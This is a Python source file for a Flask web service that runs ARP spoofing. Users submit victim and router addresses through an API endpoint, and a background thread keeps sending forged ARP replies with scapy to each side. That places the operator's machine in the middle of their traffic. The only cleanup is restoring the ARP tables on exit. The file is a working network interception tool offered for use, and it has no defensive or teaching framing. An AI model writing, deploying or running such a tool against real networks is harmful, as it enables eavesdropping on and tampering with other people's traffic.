#!/usr/bin/env python3


from flask import Flask, request, abort, jsonify, render_template
from flask_restful import Resource, Api, abort, reqparse
from werkzeug.exceptions import BadRequest
import scapy.all as scapy
import time
import uuid
import threading


# Gloabal Variables
##############################################################################
OPERATION = 2                                     # Arp Response Package
SLEEP_TIME = 5                                    # Sleep Time
RESTORE_PKG_COUNT = 3                             # Restore Package Count
SPOOFED_LIST = []                                 # List Of Spoofed Targets
DEBUG = True                                      # Debug Mode
PORT = 5002                                       # Port Number
DAEMON_THREAD = True                              # Daemon Thread

app = Flask(__name__)
api = Api(app)
##############################################################################


# Args
##############################################################################
arp_spoof_post_args = reqparse.RequestParser()
arp_spoof_post_args.add_argument("target_ip_addr",  type=str, 
        help="Target Ip Adress",  required=True)
arp_spoof_post_args.add_argument("target_mac_addr", type=str, 
        help="Target MAC Adress", required=True)
arp_spoof_post_args.add_argument("router_ip_addr",  type=str, 
        help="Router Ip Adress",  required=True)
arp_spoof_post_args.add_argument("router_mac_addr", type=str, 
        help="Router MAC Adress", required=True)
arp_spoof_post_args.add_argument("router_mac_addr", type=str,
        help="Router MAC Adress", required=True)
arp_spoof_post_args.add_argument("my_mac_addr",     type=str, 
        help="My MAC Adress")
##############################################################################


# Get My MAC Address Function
##############################################################################
def get_my_mac_addr():
    mac_addr = uuid.getnode()
    mac_addr = ':'.join(("%012x" % mac_addr)[i:i+2] for i in range(0, 12, 2))
    return mac_addr
##############################################################################


# Spoof ARP Function
##############################################################################
def redirect_arp(dest_ip,dest_mac,source_ip,source_mac,send_pkg_count=1):
    package = scapy.ARP()                         # ARP Package Generated
    package.op = OPERATION                        # Set Operation to Response
    package.pdst = dest_ip                        # Set Dest Ip Address
    package.hwdst = dest_mac                      # Set Dest MAC Address
    package.psrc = source_ip                      # Set Source Ip Address 
    package.hwsrc = source_mac                    # Set Source MAC Address
    scapy.send(package,count=send_pkg_count,      # Send the Package
            verbose=False)
##############################################################################


# Api Class
##############################################################################
class ArpSpoof(Resource):
    def get(self):
        return SPOOFED_LIST
    
    def post(self):
        args = arp_spoof_post_args.parse_args()   # Arguments

        target_ip_addr  = args['target_ip_addr']
        target_mac_addr = args['target_mac_addr']
        router_ip_addr  = args['router_ip_addr']
        router_mac_addr = args['router_mac_addr']

        if args['my_mac_addr']:
            my_mac_addr = args['my_mac_addr']
        else:
            my_mac_addr = get_my_mac_addr()

        spoof_dict = {"target_ip_addr"  : target_ip_addr ,
                      "target_mac_addr" : target_mac_addr,
                      "router_ip_addr"  : router_ip_addr,
                      "router_mac_addr" : router_mac_addr,
                      "interceptor"     : my_mac_addr}
        
        SPOOFED_LIST.append(spoof_dict)
##############################################################################


# Send Spoof Packages
##############################################################################
def send_spoof_packages():
    def run():
        while True:
            global SPOOFED_LIST
            if SPOOFED_LIST:
                for spoofed in SPOOFED_LIST:
                    target_ip_addr  = spoofed['target_ip_addr']
                    target_mac_addr = spoofed['target_mac_addr']
                    router_ip_addr  = spoofed['router_ip_addr']
                    router_mac_addr = spoofed['router_mac_addr']
                    interceptor     = spoofed['interceptor']

                    # Send Packet to the Victim to Say I am the Router
                    redirect_arp(target_ip_addr,target_mac_addr,router_ip_addr,interceptor)

                    # Send Packet to the Router to Say I am the Victim
                    redirect_arp(router_ip_addr,router_mac_addr,target_ip_addr,interceptor)

                time.sleep(SLEEP_TIME)
    thread = threading.Thread(target=run)
    thread.daemon = DAEMON_THREAD
    thread.start()
##############################################################################



# Pages
##############################################################################
## Homepage
@app.route('/', methods=['GET'])
def home():
    return render_template('home.html', port=PORT)
##############################################################################



# Endpoints
##############################################################################
api.add_resource(ArpSpoof, '/api/arp_spoof')
##############################################################################


# Main
##############################################################################
if __name__ == '__main__':
    try:
        send_spoof_packages()
        app.run(debug=DEBUG,port=PORT,threaded=True) 
    except KeyboardInterrupt:
        print("\n[-] Arp Tables Restoring...")
        if SPOOFED_LIST:
            for spoofed in SPOOFED_LIST:
                target_ip_addr  = spoofed['target_ip_addr']
                target_mac_addr = spoofed['target_mac_addr']
                router_ip_addr  = spoofed['router_ip_addr']
                router_mac_addr = spoofed['router_mac_addr']
                interceptor     = spoofed['interceptor']
        
                redirect_arp(target_ip_addr,target_mac_addr,router_ip_addr,
                        router_mac_addr,RESTORE_PKG_COUNT)
                redirect_arp(router_ip_addr,router_mac_addr,target_ip_addr,
                        target_mac_addr,RESTORE_PKG_COUNT)
                
                print("Removing....")
                print("Removing....")
                print("Removing....")
                print("\n\n########################################################################")
                print("target_ip_addr : "+str(target_ip_addr))
                print("target_mac_addr: "+str(target_mac_addr))
                print("router_ip_addr : "+str(router_ip_addr))
                print("router_mac_addr: "+str(router_mac_addr))
                print("interceptor    : "+str(interceptor))
                print("########################################################################")
        
        print("[+] Done!")
        print("[-] Quiting...")
##############################################################################